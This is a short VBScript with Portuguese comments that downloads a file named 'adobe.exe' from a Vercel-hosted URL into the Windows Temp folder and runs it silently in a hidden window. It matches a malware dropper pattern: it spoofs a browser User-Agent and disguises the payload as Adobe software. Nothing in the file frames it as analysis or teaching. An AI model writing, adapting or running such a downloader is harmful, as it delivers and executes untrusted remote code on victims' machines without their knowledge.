Option Explicit

Dim url, caminhoDestino, http, stream, fso

' URL hospedada no Vercel
url = "https://testando123-blond.vercel.app/adobe.exe"

' Caminho de destino no Temp
Set fso = CreateObject("Scripting.FileSystemObject")
caminhoDestino = fso.GetSpecialFolder(2) & "\adobe.exe"

' Apaga se já existir
If fso.FileExists(caminhoDestino) Then
    On Error Resume Next
    fso.DeleteFile caminhoDestino, True
    On Error GoTo 0
End If

' Cria a requisição HTTP com cabeçalhos
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.setRequestHeader "User-Agent", "Mozilla/5.0"
http.setRequestHeader "Accept", "*/*"
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binário
    stream.Open
    stream.Write http.responseBody

    On Error Resume Next
    stream.SaveToFile caminhoDestino, 2
    If Err.Number <> 0 Then
        MsgBox "Erro ao gravar o arquivo: " & Err.Description
        WScript.Quit
    End If
    On Error GoTo 0
    stream.Close

    ' Executar
    CreateObject("WScript.Shell").Run Chr(34) & caminhoDestino & Chr(34), 0, False
Else
    MsgBox "Erro ao baixar: " & http.Status
End If
